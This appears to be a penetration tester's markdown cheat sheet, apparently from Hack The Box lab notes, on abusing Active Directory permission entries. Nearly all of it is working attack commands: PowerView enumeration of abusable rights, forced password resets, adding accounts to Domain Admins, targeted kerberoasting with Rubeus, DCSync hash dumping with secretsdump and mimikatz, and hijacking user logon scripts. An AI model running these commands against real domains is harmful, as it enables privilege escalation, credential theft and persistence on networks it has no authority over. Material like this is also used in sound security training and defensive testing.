---
tags:
  - Add-Members
  - Addself
  - AllExtendedRights
  - DS-Replication-Get-Changes
  - ForceChangePassword
  - GenericAll
  - GenericWrite
  - Lateral-Movement
  - Persistence
  - Privilege-Escalation
  - Self-Membership
  - WriteDACL
  - WriteOwner
  - WriteProperty
  - AD
---

List of abusable ACEs
    
- `ForceChangePassword` abused with `Set-DomainUserPassword`
- `Add Members` abused with `Add-DomainGroupMember`
- `GenericAll` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`
- `GenericWrite` abused with `Set-DomainObject`
- `WriteOwner` abused with `Set-DomainObjectOwner`
- `WriteDACL` abused with `Add-DomainObjectACL`
- `AllExtendedRights` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`
- `Addself` abused with `Add-DomainGroupMember`
## Identify
---
**Windows (powerview)**
```Python
Find-InterestingDomainAcl
```
```Python
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid wley
```
```PowerShell
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
```
Check what objects have ACLs over a specific user
```powershell
Get-DomainObjectAcl -Identity harry.jones -Domain inlanefreight.local -ResolveGUIDs
```


ACLs are granted to USER1 over USER2
```powershell
(Get-ACL "AD:$((Get-ADUser <USER2>).distinguishedname)").access  | ? {$_.IdentityReference -eq "DOMAIN.LOCAL\USER1"}
```
FInd all users with a specific ACL over USER1 (GenericAll in this example)
```powershell
(Get-ACL "AD:$((Get-ADUser <USER1>).distinguishedname)").access  | ? {$_.ActiveDirectoryRights -match "WriteProperty" -or $_.ActiveDirectoryRights -match "GenericAll"} | Select IdentityReference,ActiveDirectoryRights -Unique | ft -W
```

!!! alert "Note"
	that if PowerView has already been imported, the cmdlet shown below will result in an error. Therefore, we may need to run it from a new PowerShell session.
	**Or just look at bloodhound**


**Manually**
```PowerShell
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```
```PowerShell
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
```
from here we would google the “ObjectType” entry to find the rights the GUID represents
# Exploit
---
## Force-Change-Password
---
```PowerShell
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) 
```
```PowerShell
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```
```PowerShell
Import-Module .\Powerview.ps1
```
```PowerShell
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```
## Add-DomainGroupMember
---
```PowerShell
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 
```
```PowerShell
Import-Module .\Powerview.ps1
```
```PowerShell
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```
```PowerShell
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```
## GenericAll
---
**Targeted kerberoast**
```PowerShell
Import-Module .\Powerview.ps1
```
```PowerShell
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```
```PowerShell
.\Rubeus.exe kerberoast /user:adunn /nowrap
```
**Add user to domain admins**
```Bash
Net group "domain admins" <user> /add /domain
```
## DS-Replication-Get-Changes-All
---
From linux
```Bash
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
```
**From windows**
```Bash
runas /netonly /user:INLANEFREIGHT\adunn powershell
```
```Bash
.\mimikatz.exe
privilege::debug
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```
## Remove SPN
---
**Removing the Fake SPN from adunn's Account**
```PowerShell
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
```
**Removing damundsen from the Help Desk Level 1 Group**
```PowerShell
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```
Confirming damundsen was Removed from the Group
```PowerShell
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
```
## GenericWrite on User
---
####  Targeted Kerberoasting
---
Set SPN (if you're running a process as the user with GenericWrite)
```
setspn -a domain.local/user.domain.local:1337 domain.local\user
```
!!! alert "If your're running as different user"
	
	Import-Module .\Powerview.ps1
	$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
	$Cred = New-Object System.Management.Automation.PSCredential('object.local\smith', $SecPassword)

	Set-DomainObject -Credential $Cred -Identity maria -SET @{serviceprincipalname='foobar/xd'}

### Change users logon scripts
___
Global writeable location
```powershell
cd C:\programdata\
echo 'whoami > C:\programdata\out.txt' > test.ps1

Set-DomainObject -Identity <targetuser> -SET @{scriptpath='C:\programdata\test.ps1'}
```
check if it worked
```
net user <target user>
```
